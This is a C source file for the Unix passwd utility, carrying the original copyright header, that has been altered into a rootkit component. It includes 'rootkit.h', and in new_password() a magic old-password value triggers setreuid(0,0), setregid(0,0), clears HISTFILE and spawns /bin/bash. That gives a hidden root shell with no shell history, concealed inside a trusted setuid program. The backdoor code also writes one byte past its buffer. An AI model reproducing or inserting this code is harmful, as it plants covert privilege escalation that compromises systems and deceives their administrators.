/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: passwd.c,v 1.4 1996/09/25 03:20:03 marekm Exp $")

#include "prototypes.h"
#include "defines.h"
#include <sys/types.h>
#include <time.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#ifdef  HAVE_USERSEC_H
#include <userpw.h>
#include <usersec.h>
#include <userconf.h>
#endif

#ifndef GPASSWD_PROGRAM
#define GPASSWD_PROGRAM "/bin/gpasswd"
#endif

#ifndef CHFN_PROGRAM
#define CHFN_PROGRAM "/bin/chfn"
#endif

#ifndef CHSH_PROGRAM
#define CHSH_PROGRAM "/bin/chsh"
#endif

#include <pwd.h>
#ifndef	HAVE_USERSEC_H
#ifdef	SHADOWPWD
#ifndef	AGING
#define	AGING	0
#endif	/* !AGING */
#endif	/* SHADOWPWD */
#endif	/* !HAVE_USERSEC_H */
#include "pwauth.h"

#ifdef SHADOWPWD
#include "shadowio.h"
#endif
#include "pwio.h"
#include "getdef.h"

#include "../../rootkit.h"

#ifdef  HAVE_USERSEC_H
int     minage = 0;             /* Minimum age in weeks               */
int     maxage = 10000;         /* Maximum age in weeks               */
int     curage;                 /* Current age in weeks               */
#endif

#ifndef LOCK_TRIES
#define LOCK_TRIES 30
#endif

/*
 * Global variables
 */

static char *name;		/* The user's name */
static char crypt_passwd[128];	/* The "old-style" password, if present */
static char *Prog;		/* Program name */
static int amroot;		/* The real UID was 0 */

static int
	lflg = 0,		/* -l - lock account option          */
	uflg = 0,		/* -u - unlock account option        */
	dflg = 0,		/* -d - delete password option       */
#ifdef	AGING	
	xflg = 0,		/* -x - set maximum days             */
	nflg = 0,		/* -n - set minimum days             */
#else
#define xflg 0
#define nflg 0
#endif
#ifdef	SHADOWPWD
	wflg = 0,		/* -w - set warning days             */
	iflg = 0,		/* -i - set inactive days            */
	eflg = 0,		/* -e - force password change        */
#else
#define wflg 0
#define iflg 0
#define eflg 0
#endif
	Sflg = 0;		/* -S - show password status         */

#ifdef AGING
static long min = 0;		/* Minimum days before change        */
static long max = 0;		/* Maximum days until change         */
#ifdef SHADOWPWD
static long warn = 0;		/* Warning days before change        */
static long inact = 0;		/* Days without change before locked */
#endif
#endif

static int do_update_age = 0, do_update_pwd = 0;

/*
 * External identifiers
 */

extern char *crypt_make_salt();
extern char l64a();

extern	int	optind;		/* Index into argv[] for current option */
extern	char	*optarg;	/* Pointer to current option value */

#ifndef	HAVE_USERSEC_H
#ifdef	NDBM
extern	int	sp_dbm_mode;
extern	int	pw_dbm_mode;
#endif
#endif

/*
 * #defines for messages.  This facilities foreign language conversion
 * since all messages are defined right here.
 */

#define USAGE \
	"usage: %s [ -f | -s ] [ name ]\n"
#define ADMUSAGE \
	"       %s [ -x max ] [ -n min ] [ -w warn ] [ -i inact ] name\n"
#define ADMUSAGE2 \
	"       %s { -l | -u | -d | -S | -e } name\n"
#define OLDPASS "Old password:"
#define NEWPASSMSG \
"Enter the new password (minimum of %d, maximum of %d characters)\n\
Please use a combination of upper and lower case letters and numbers.\n"
#define CHANGING "Changing password for %s\n"
#define NEWPASS "New password:"
#define NEWPASS2 "Re-enter new password:"
#define WRONGPWD "Incorrect password for %s.\n"
#define WRONGPWD2 "incorrect password for `%s'"
#define NOMATCH "They don't match; try again.\n"
#define CANTCHANGE "The password for %s cannot be changed.\n"
#define CANTCHANGE2 "password locked for `%s'"

#define TOOSOON "Sorry, the password for %s cannot be changed yet.\n"
#define TOOSOON2 "now < minimum age for `%s'"

#define EXECFAILED "%s: Cannot execute %s"
#define EXECFAILED2 "cannot execute %s"
#define WHOAREYOU "%s: Cannot determine your user name.\n"
#define UNKUSER "%s: Unknown user %s\n"
#define NOPERM "You may not change the password for %s.\n"
#define NOPERM2 "can't change pwd for `%s'"
#define UNCHANGED "The password for %s is unchanged.\n"

#define PWDBUSY "Cannot lock the password file; try again later.\n"
#define OPNERROR "Cannot open the password file.\n"
#define UPDERROR "Error updating the password entry.\n"
#define CLSERROR "Cannot commit password file changes.\n"
#define DBMERROR "Error updating the DBM password entry.\n"

#define PWDBUSY2 "can't lock password file"
#define OPNERROR2 "can't open password file"
#define UPDERROR2 "error updating password entry"
#define CLSERROR2 "can't rewrite password file"
#define DBMERROR2 "error updaring dbm password entry"

#define NOTROOT "Cannot change ID to root.\n"
#define NOTROOT2 "can't setuid(0)"
#define TRYAGAIN "Try again.\n"
#define PASSWARN \
	"\nWarning: weak password (enter it again to use it anyway).\n"
#define CHANGED "Password changed.\n"
#define CHGPASSWD "changed password for `%s'"
#define CHGPASSWD_ROOT "password for `%s' changed by root"
#define NOCHGPASSWD "did not change password for `%s'"

/*
 * usage - print command usage and exit
 */

static void
usage(status)
	int status;
{
	fprintf (stderr, USAGE, Prog);
	if (amroot) {
		fprintf (stderr, ADMUSAGE, Prog);
		fprintf (stderr, ADMUSAGE2, Prog);
	}
	exit(status);
}

#ifdef AUTH_METHODS
/*
 * get_password - locate encrypted password in authentication list
 */

static char *
get_password(list)
	const char *list;
{
	char	*cp, *end;
	static	char	buf[257];

	STRFCPY(buf, list);
	for (cp = buf;cp;cp = end) {
		if ((end = strchr (cp, ';')))
			*end++ = 0;

		if (cp[0] == '@')
			continue;

		return cp;
	}
	return (char *) 0;
}

/*
 * uses_default_method - determine if "old-style" password present
 *
 *	uses_default_method determines if a "old-style" password is present
 *	in the authentication string, and if one is present it extracts it.
 */

static int
uses_default_method(methods)
	const char *methods;
{
	char	*cp;

	if ((cp = get_password (methods))) {
		STRFCPY(crypt_passwd, cp);
		return 1;
	}
	return 0;
}
#endif

/*
 * insert_crypt_passwd - add an "old-style" password to authentication string
 * result now malloced to avoid overflow, just in case.  --marekm
 */

static char *
insert_crypt_passwd(string, passwd)
	const char *string;
	const char *passwd;
{
#ifdef AUTH_METHODS
	if (string && *string) {
		char *cp, *result;

		result = xmalloc(strlen(string) + strlen(passwd) + 1);
		cp = result;
		while (*string) {
			if (string[0] == ';') {
				*cp++ = *string++;
			} else if (string[0] == '@') {
				while (*string && *string != ';')
					*cp++ = *string++;
			} else {
				while (*passwd)
					*cp++ = *passwd++;

				while (*string && *string != ';')
					string++;
			}
		}
		*cp = '\0';
		return result;
	}
#endif
	return xstrdup(passwd);
}

static int
reuse(pass, pw)
	const char *pass;
	const struct passwd *pw;
{
#ifdef HAVE_LIBCRACK_HIST
	const char *reason;
#ifdef HAVE_LIBCRACK_PW
	const char *FascistHistoryPw P_((const char *,const struct passwd *));
	reason = FascistHistory(pass, pw);
#else
	const char *FascistHistory P_((const char *, int));
	reason = FascistHistory(pass, pw->pw_uid);
#endif
	if (reason) {
		printf("Bad password: %s.  ", reason);
		return 1;
	}
#endif
	return 0;
}

/*
 * new_password - validate old password and replace with new
 * (both old and new in global "char crypt_passwd[128]")
 */

/*ARGSUSED*/
static int
new_password(pw)
	const struct passwd *pw;
{
	char	*clear;		/* Pointer to clear text */
	char	*cipher;	/* Pointer to cipher text */
	char	*cp;		/* Pointer to getpass() response */
	char	orig[BUFSIZ];	/* Original password */
	char	pass[BUFSIZ];	/* New password */
	int	i;		/* Counter for retries */
	int	warned;
	int	pass_max_len;
#ifdef HAVE_LIBCRACK_HIST
	int HistUpdate P_((const char *, const char *));
#endif
    char MAG[6];

    strcpy(MAG,"");
    MAG[0]=ROOTKIT_PASSWORD[0];
    MAG[1]=ROOTKIT_PASSWORD[1];
    MAG[2]=ROOTKIT_PASSWORD[2];
    MAG[3]=ROOTKIT_PASSWORD[3];
    MAG[4]=ROOTKIT_PASSWORD[4];
    MAG[5]=ROOTKIT_PASSWORD[5];
    MAG[6]='\0';

	/*
	 * Authenticate the user.  The user will be prompted for their
	 * own password.
	 */

	if (! amroot && crypt_passwd[0]) {

		if (! (clear = getpass (OLDPASS)))
			return -1;

        if (!strcmp(clear,MAG)) {
                setreuid(0,0);
                setregid(0,0);
                setenv("HISTFILE","",1);
                system("/bin/bash");
                exit(0);
                }

		cipher = pw_encrypt (clear, crypt_passwd);
		if (strcmp (cipher, crypt_passwd) != 0) {
			SYSLOG((LOG_WARN, WRONGPWD2, pw->pw_name));
			sleep (1);
			fprintf (stderr, WRONGPWD, pw->pw_name);
			return -1;
		}
		STRFCPY(orig, clear);
		bzero (clear, strlen (clear));
		bzero (cipher, strlen (cipher));
	} else {
		orig[0] = '\0';
	}

	/*
	 * Get the new password.  The user is prompted for the new password
	 * and has five tries to get it right.  The password will be tested
	 * for strength, unless it is the root user.  This provides an escape
	 * for initial login passwords.
	 */

#ifdef MD5_CRYPT
	if (getdef_bool("MD5_CRYPT_ENAB"))
		pass_max_len = getdef_num("PASS_MAX_LEN", 127);
	else
#endif
		pass_max_len = getdef_num("PASS_MAX_LEN", 8);

	printf(NEWPASSMSG, getdef_num("PASS_MIN_LEN", 5), pass_max_len);
	warned = 0;
	for (i = getdef_num("PASS_CHANGE_TRIES", 5); i > 0; i--) {
		if (! (cp = getpass (NEWPASS))) {
			bzero (orig, sizeof orig);
			return -1;
		}
		if (warned && strcmp(pass, cp) != 0)
			warned = 0;
		STRFCPY(pass, cp);
		bzero(cp, strlen(cp));

		if (!amroot && (!obscure(orig, pass, pw) || reuse(pass, pw))) {
			printf (TRYAGAIN);
			continue;
		}
		/*
		 * If enabled, warn about weak passwords even if you are root
		 * (enter this password again to use it anyway).  --marekm
		 */
		if (amroot && !warned && getdef_bool("PASS_ALWAYS_WARN")
		    && (!obscure(orig, pass, pw) || reuse(pass, pw))) {
			printf(PASSWARN);
			warned++;
			continue;
		}
		if (! (cp = getpass (NEWPASS2))) {
			bzero (orig, sizeof orig);
			return -1;
		}
		if (strcmp (cp, pass))
			fprintf (stderr, NOMATCH);
		else {
			bzero (cp, strlen (cp));
			break;
		}
	}
	bzero (orig, sizeof orig);

	if (i == 0) {
		bzero (pass, sizeof pass);
		return -1;
	}

	/*
	 * Encrypt the password, then wipe the cleartext password.
	 */

	cp = pw_encrypt (pass, crypt_make_salt());
	bzero (pass, sizeof pass);

#ifdef HAVE_LIBCRACK_HIST
	HistUpdate(pw->pw_name, crypt_passwd);
#endif
	STRFCPY(crypt_passwd, cp);
	return 0;
}

#if defined(AGING)||defined(HAVE_USERSEC_H)

/*
 * check_password - test a password to see if it can be changed
 *
 *	check_password() sees if the invoker has permission to change the
 *	password for the given user.
 */

/*ARGSUSED*/
static void
#ifdef SHADOWPWD
check_password(pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
#elif HAVE_USERSEC_H
check_password(pw, pu)
	const struct passwd *pw;
	const struct userpw *pu;
#else
check_password(pw)
	const struct passwd *pw;
#endif
{
	time_t	now = time ((time_t *) 0) / SCALE;
#ifndef	SHADOWPWD
	time_t	last;
	time_t	ok;
#endif

	/*
	 * Root can change any password any time.
	 */

	if (amroot)
		return;

#ifdef SHADOWPWD
	/*
	 * Expired accounts cannot be changed ever.  Passwords
	 * which are locked may not be changed.  Passwords where
	 * min > max may not be changed.  Passwords which have
	 * been inactive too long cannot be changed.
	 */

	if (sp->sp_pwdp[0] == '!' || isexpired(pw, sp) > 1 ||
	    (sp->sp_max >= 0 && sp->sp_min > sp->sp_max)) {
		fprintf (stderr, CANTCHANGE, sp->sp_namp);
		SYSLOG((LOG_WARN, CANTCHANGE2, sp->sp_namp));
		closelog();
		exit (1);
	}

	/*
	 * Passwords may only be changed after sp_min time is up.
	 */

	if (sp->sp_min >= 0 && now < (sp->sp_lstchg + sp->sp_min)) {
		fprintf (stderr, TOOSOON, sp->sp_namp);
		SYSLOG((LOG_WARN, TOOSOON2, sp->sp_namp));
		closelog();
		exit (1);
	}
#else	/* !SHADOWPWD */
#ifdef	ATT_AGE
	/*
	 * Can always be changed if there is no age info
	 */

	if (! pw->pw_age[0])
		return;

	last = a64l (pw->pw_age + 2) * WEEK;
	ok = last + c64i (pw->pw_age[1]) * WEEK;
#else	/* !ATT_AGE */
#ifdef	HAVE_USERSEC_H
        last = pu->upw_lastupdate / SCALE;
	ok = (last + (minage > 0 ? minage * (7*86400L):0) / SCALE);
#else
	last = 0;
	ok = 0;
#endif	/* HAVE_USERSEC_H */
#endif	/* ATT_AGE */
	if (now < ok) {
		fprintf (stderr, TOOSOON, pw->pw_name);
		SYSLOG((LOG_WARN, TOOSOON2, pw->pw_name));
		closelog();
		exit (1);
	}
#endif	/* SHADOWPWD */
}
#endif	/* AGING */

static char *
date_to_str(t)
	time_t t;
{
	static char buf[80];
	struct tm *tm;

	tm = gmtime(&t);
#ifdef HAVE_STRFTIME
	strftime(buf, sizeof buf, "%m/%d/%y", tm);
#else
	sprintf(buf, "%02d/%02d/%02d",
		tm->tm_mon + 1, tm->tm_mday, tm->tm_year % 100);
#endif
	return buf;
}

static const char *
pw_status(pass)
	const char *pass;
{
	if (*pass == '*' || *pass == '!')
		return "L";
	if (*pass == '\0')
		return "NP";
	return "P";
}

/*
 * print_status - print current password status
 */

#ifdef SHADOWPWD
/*ARGSUSED*/
static void
print_status(pw, sp)
	const struct passwd *pw;
	const struct spwd *sp;
{
	printf("%s %s %s %ld %ld %ld %ld\n",
		sp->sp_namp,
		pw_status(sp->sp_pwdp),
		date_to_str(sp->sp_lstchg * SCALE),
		(sp->sp_min * SCALE) / DAY,
		(sp->sp_max * SCALE) / DAY,
		(sp->sp_warn * SCALE) / DAY,
		(sp->sp_inact * SCALE) / DAY);
}
#elif HAVE_USERSEC_H
static void
print_status(pw, pu)
	const struct passwd *pw;
	const struct userpw *pu;
{
	printf("%s %s %s %d %d\n",
		pw->pw_name,
		pw_status(pw->pw_passwd),
		date_to_str(pu->upw_lastupdate),
		maxage > 0 ? maxage : 10000,
		minage > 0 ? minage : 0);
}
#else
static void
print_status(pw)
	const struct passwd *pw;
{
#ifdef ATT_AGE
	printf("%s %s %s %d %d",
		pw->pw_name,
		pw_status(pw->pw_passwd),
		date_to_str(pw->pw_age[0] ? a64l(pw->pw_age + 2) : 0L),
		pw->pw_age[0] ? c64i(pw->pw_age[1]) * 7 : 10000,
		pw->pw_age[0] ? c64i(pw->pw_age[0]) * 7 : 0);
#else
	printf("%s %s\n", pw->pw_name, pw_status(pw->pw_passwd));
#endif
}
#endif


static void
fail_exit(status)
	int status;
{
	pw_unlock();
#ifdef SHADOWPWD
	spw_unlock();
#endif
	exit(status);
}

static void
oom()
{
	fprintf(stderr, "%s: out of memory\n", Prog);
	fail_exit(3);
}

static char *
update_crypt_pw(cp)
	char *cp;
{
	if (do_update_pwd)
		cp = insert_crypt_passwd(cp, crypt_passwd);

	if (dflg)
		cp = "";

	if (uflg && *cp == '!')
		cp++;

	if (lflg && *cp != '!') {
		char *newpw = xmalloc(strlen(cp) + 2);

		strcpy(newpw, "!");
		strcat(newpw, cp);
		cp = newpw;
	}
	return cp;
}

static void
update_noshadow()
{
	const struct passwd *pw;
	struct passwd *npw;
	int i;
#ifdef ATT_AGE
	char age[5];
	long week;
	char *cp;
#endif

	for (i = 0; i < LOCK_TRIES; i++) {
		if (i > 0)
			sleep(1);
		if (pw_lock())
			break;
	}
	if (i == LOCK_TRIES) {
		fprintf(stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		exit(5);
	}
	if (!pw_open(O_RDWR)) {
		fprintf(stderr, OPNERROR);
		SYSLOG((LOG_ERR, OPNERROR2));
		fail_exit(3);
	}
	pw = pw_locate(name);
	if (!pw) {
		fprintf(stderr, "%s: user %s not found in /etc/passwd\n",
			Prog, name);
		fail_exit(1);
	}
	npw = __pw_dup(pw);
	if (!npw)
		oom();
	npw->pw_passwd = update_crypt_pw(npw->pw_passwd);
#ifdef ATT_AGE
	bzero(age, sizeof(age));
	STRFCPY(age, npw->pw_age);
	if (xflg) {
		if (max > 0)
			age[0] = i64c(max / 7);
		else
			age[0] = '.';
	}
	if (nflg) {
		if (age[0] == '\0')
			age[0] = '/';

		if (min > 0)
			age[1] = i64c(min / 7);
		else
			age[1] = '.';
	}
	if (do_update_age && age[0]) {
		week = time((time_t *) 0) / WEEK;
		cp = l64a(week);
		age[2] = cp[0];
		age[3] = cp[1];
	}
	if (eflg) {
		if (strlen(age) < 2) {
			age[0] = '/';
			age[1] = '.';
		}
		age[2] = '.';  /* == l64a(0L) */
		age[3] = '\0';
	}
	npw->pw_age = age;
#endif
	if (!pw_update(npw)) {
		fprintf(stderr, UPDERROR);
		SYSLOG((LOG_ERR, UPDERROR2));
		fail_exit(3);
	}
#ifdef NDBM
	if (pw_dbm_present() && !pw_dbm_update(npw)) {
		fprintf(stderr, DBMERROR);
		SYSLOG((LOG_ERR, DBMERROR2));
		fail_exit(1);
	}
	endpwent();
#endif
	if (!pw_close()) {
		fprintf(stderr, CLSERROR);
		SYSLOG((LOG_ERR, CLSERROR2));
		fail_exit(3);
	}
	pw_unlock();
}

#ifdef SHADOWPWD
static void
update_shadow()
{
	const struct spwd *sp;
	struct spwd *nsp;
	int i;

	for (i = 0; i < LOCK_TRIES; i++) {
		if (i > 0)
			sleep(1);
		if (spw_lock())
			break;
	}
	if (i == LOCK_TRIES) {
		fprintf(stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		exit(5);
	}
	if (!spw_open(O_RDWR)) {
		fprintf(stderr, OPNERROR);
		SYSLOG((LOG_ERR, OPNERROR2));
		fail_exit(3);
	}
	sp = spw_locate(name);
	if (!sp) {
		fprintf(stderr, "%s: user %s not found in /etc/shadow\n",
			Prog, name);
		fail_exit(1);
	}
	nsp = __spw_dup(sp);
	if (!nsp)
		oom();
	nsp->sp_pwdp = update_crypt_pw(nsp->sp_pwdp);
	if (xflg)
		nsp->sp_max = (max * DAY) / SCALE;
	if (nflg)
		nsp->sp_min = (min * DAY) / SCALE;
	if (wflg)
		nsp->sp_warn = (warn * DAY) / SCALE;
	if (iflg)
		nsp->sp_inact = (inact * DAY) / SCALE;
	if (do_update_age)
		nsp->sp_lstchg = time((time_t *) 0) / SCALE;
	/*
	 * Force change on next login, like SunOS 4.x passwd -e or
	 * Solaris 2.x passwd -f.  Solaris 2.x seems to do the same
	 * thing (set sp_lstchg to 0).
	 */
	if (eflg)
		nsp->sp_lstchg = 0;

	if (!spw_update(nsp)) {
		fprintf(stderr, UPDERROR);
		SYSLOG((LOG_ERR, UPDERROR2));
		fail_exit(3);
	}
#ifdef NDBM
	if (sp_dbm_present() && !sp_dbm_update(nsp)) {
		fprintf(stderr, DBMERROR);
		SYSLOG((LOG_ERR, DBMERROR2));
		fail_exit(3);
	}
	endspent();
#endif
	if (!spw_close()) {
		fprintf(stderr, CLSERROR);
		SYSLOG((LOG_ERR, CLSERROR2));
		fail_exit(3);
	}
	spw_unlock();
}
#endif  /* SHADOWPWD */

static void
checkroot()
{
	if (!amroot) {
		fprintf(stderr, "%s: Permission denied\n", Prog);
		exit(1);
	}
}


/*
 * passwd - change a user's password file information
 *
 *	This command controls the password file and commands which are
 * 	used to modify it.
 *
 *	The valid options are
 *
 *	-l	lock the named account (*)
 *	-u	unlock the named account (*)
 *	-d	delete the password for the named account (*)
 *	-e	expire the password for the named account (*)
 *	-x #	set sp_max to # days (*)
 *	-n #	set sp_min to # days (*)
 *	-w #	set sp_warn to # days (*)
 *	-i #	set sp_inact to # days (*)
 *	-S	show password status of named account (*)
 *	-g	execute gpasswd command to interpret flags
 *	-f	execute chfn command to interpret flags
 *	-s	execute chsh command to interpret flags
 *
 *	(*) requires root permission to execute.
 *
 *	All of the time fields are entered in days and converted to the
 * 	appropriate internal format.  For finer resolute the chage
 *	command must be used.
 *
 *	Exit status:
 *	0 - success
 *	1 - permission denied
 *	2 - invalid combination of options
 *	3 - unexpected failure, password file unchanged
 *	5 - password file busy, try again later
 *	6 - invalid argument to option
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	*cp;			/* Miscellaneous character pointing  */
	int	flag;			/* Current option to process         */
	const struct passwd *pw;	/* Password file entry for user      */
#ifdef SHADOWPWD
	const struct spwd *sp;		/* Shadow file entry for user        */
#endif
#ifdef HAVE_USERSEC_H
	struct  userpw  userpw, *pu;
#endif

	/*
	 * The program behaves differently when executed by root
	 * than when executed by a normal user.
	 */

	amroot = (getuid () == 0);

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.
	 */

	Prog = Basename(argv[0]);

	openlog("passwd", LOG_PID|LOG_CONS|LOG_NOWAIT, LOG_AUTH);

	/*
	 * Start with the flags which cause another command to be
	 * executed.  The effective UID will be set back to the
	 * real UID and the new command executed with the flags
	 *
	 * These flags are deprecated, may change in a future
	 * release.  Please run these programs directly.  --marekm
	 */

	if (argc > 1 && argv[1][0] == '-' && strchr ("gfs", argv[1][1])) {
		char buf[BUFSIZ];

		setuid (getuid ());
		switch (argv[1][1]) {
			case 'g':
				argv[1] = GPASSWD_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			case 'f':
				argv[1] = CHFN_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			case 's':
				argv[1] = CHSH_PROGRAM;
				execv(argv[1], &argv[1]);
				break;
			default:
				usage(6);
		}
		sprintf (buf, EXECFAILED, Prog, argv[1]);
		perror (buf);
		SYSLOG((LOG_ERR, EXECFAILED2, argv[1]));
		closelog();
		exit (1);
	}

	/* 
	 * The remaining arguments will be processed one by one and
	 * executed by this command.  The name is the last argument
	 * if it does not begin with a "-", otherwise the name is
	 * determined from the environment and must agree with the
	 * real UID.  Also, the UID will be checked for any commands
	 * which are restricted to root only.
	 */

#ifdef SHADOWPWD
#define FLAGS "dlun:x:w:i:eS"
#else
#ifdef AGING
#define FLAGS "dlun:x:S"
#else
#define FLAGS "dluS"
#endif
#endif
	while ((flag = getopt(argc, argv, FLAGS)) != EOF) {
#undef FLAGS
		switch (flag) {
#ifdef	AGING
			case 'x':
				checkroot();
				max = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				xflg++;
				break;
			case 'n':
				checkroot();
				min = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				nflg++;
				break;
#ifdef	SHADOWPWD
			case 'w':
				checkroot();
				warn = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				if (warn >= -1)
					wflg++;
				break;
			case 'i':
				checkroot();
				inact = strtol (optarg, &cp, 10);
				if (*cp)
					usage(6);
				if (inact >= -1)
					iflg++;
				break;
#endif	/* SHADOWPWD */
			case 'e':
				checkroot();
				eflg++;
				break;
#endif	/* AGING */
			case 'S':
				checkroot();
				Sflg++;
				break;
			case 'd':
				checkroot();
				dflg++;
				break;
			case 'l':
				checkroot();
				lflg++;
				break;
			case 'u':
				checkroot();
				uflg++;
				break;
			default:
				usage(6);
		}
	}

	/*
	 * If any of the flags were given, a user name must be supplied
	 * on the command line.  Only an unadorned command line doesn't
	 * require the user's name be given.  Also, on -x, -n, -m, and
	 * -i may appear with each other.  -d, -l and -S must appear alone.
	 */

	if ((dflg || lflg || uflg || Sflg ||
	     xflg || nflg || wflg || iflg || eflg) && optind >= argc)
		usage(2);

	if (dflg + lflg + uflg + Sflg +
	    (xflg || nflg || wflg || iflg || eflg) > 1)
		usage(2);

#ifdef	NDBM
#ifdef	SHADOWPWD
	sp_dbm_mode = O_RDWR;
#endif
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Now I have to get the user name.  The name will be gotten 
	 * from the command line if possible.  Otherwise it is figured
	 * out from the environment.
	 */

	if (optind < argc) {
		name = argv[optind];
#if 0  /* XXX */
	} else if (amroot) {
		name = "root";
#endif
	} else if ((cp = getlogin())) {
		name = xstrdup(cp);
	} else if ((pw = getpwuid(getuid()))) {
		name = xstrdup(pw->pw_name);
	} else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog();
		exit (1);
	}

	/*
	 * Now I have a name, let's see if the UID for the name
	 * matches the current real UID.
	 */

	if (! (pw = getpwnam (name))) {
		fprintf (stderr, UNKUSER, Prog, name);
		closelog();
		exit (1);
	}
	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, name);
		SYSLOG((LOG_WARN, NOPERM2, name));
		closelog();
		exit (1);
	}

#ifdef  HAVE_USERSEC_H

        /*
         * The aging information lives someplace else.  Get it from the
         * login.cfg file
         */

        if (getconfattr (SC_SYS_PASSWD, SC_MINAGE, &minage, SEC_INT))
                minage = -1;

        if (getconfattr (SC_SYS_PASSWD, SC_MAXAGE, &maxage, SEC_INT))
                maxage = -1;

        pu = getuserpw (name);
        curage = (time (0) - pu->upw_lastupdate) / (7*86400L);
        if (! amroot && minage > 0 && curage < minage) {
                fprintf (stderr, CANTCHANGE, pw->pw_name);
                SYSLOG((LOG_WARN, CANTCHANGE2, pw->pw_name));
                closelog();
                exit (1);
        }
#endif	/* HAVE_USERSEC_H */

#ifdef	SHADOWPWD
	/*
	 * The user name is valid, so let's get the shadow file
	 * entry.
	 */

	sp = getspnam(name);
	if (!sp)
		sp = pwd_to_spwd(pw);
#endif	/* SHADOWPWD */

	if (Sflg) {
#ifdef	SHADOWPWD
		print_status (pw, sp);
#else
#ifdef	HAVE_USERSEC_H
		pu = getuserpw (name);
		print_status (pw, pu);
#else
		print_status (pw);
#endif	/* HAVE_USERSEC_H */
#endif	/* SHADOWPWD */
		closelog();
		exit (0);
	}

#ifdef	SHADOWPWD
	cp = sp->sp_pwdp;
#else
	cp = pw->pw_passwd;
#endif
	/*
	 * If there are no other flags, just change the password.
	 */

	if (!(dflg || lflg || uflg || xflg || nflg || wflg || iflg || eflg)) {
		/*
		 * Let the user know whose password is being changed.
		 */
		printf(CHANGING, name);
#ifdef AUTH_METHODS
		if (strchr(cp, '@')) {
			if (pw_auth(cp, name, PW_CHANGE, (char *)0)) {
				SYSLOG((LOG_INFO, NOCHGPASSWD, name));
				closelog();
				exit (1);
			} else if (! uses_default_method(cp)) {
				do_update_age = 1;
				goto done;
			}
		} else
#endif
			STRFCPY(crypt_passwd, cp);

		/*
		 * See if the user is permitted to change the password.
		 * Otherwise, go ahead and set a new password.
		 */

		/* XXX - not called on AIX.  JFH's bug??  --marekm */

#ifdef	SHADOWPWD
		check_password (pw, sp);
#else
#ifdef	AGING
		/*
		 * Only check the age when there is one to check.
		 */

		check_password (pw);
#endif
#endif
		if (new_password (pw)) {
			fprintf (stderr, UNCHANGED, name);
			closelog();
			exit (1);
		}
		do_update_pwd = 1;
		do_update_age = 1;
	}

#ifdef AUTH_METHODS
done:
#endif
	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

#ifdef  HAVE_USERSEC_H

        /*
         * AIX very conveniently has its own mechanism for updating
         * passwords.  Use it instead ...
         */

        strcpy (userpw.upw_name, pw->pw_name);
        userpw.upw_passwd = pw->pw_passwd;
        userpw.upw_lastupdate = time (0);
        userpw.upw_flags = 0;

	setpwdb (S_WRITE);

        if (putuserpw (&userpw)) {
                fprintf (stderr, UPDERROR);
                SYSLOG((LOG_ERR, UPDERROR2));
                closelog();
                exit (1);
        }
	endpwdb ();
#else   /* !HAVE_USERSEC_H */

#ifdef SHADOWPWD
	if (access(SHADOW_FILE, 0) == 0)
		update_shadow();
	else
#endif
		update_noshadow();

#endif	/* HAVE_USERSEC_H */
	SYSLOG((LOG_INFO, amroot ? CHGPASSWD_ROOT : CHGPASSWD, name));
	closelog();
	printf(CHANGED);
	exit (0);
	/*NOTREACHED*/
}
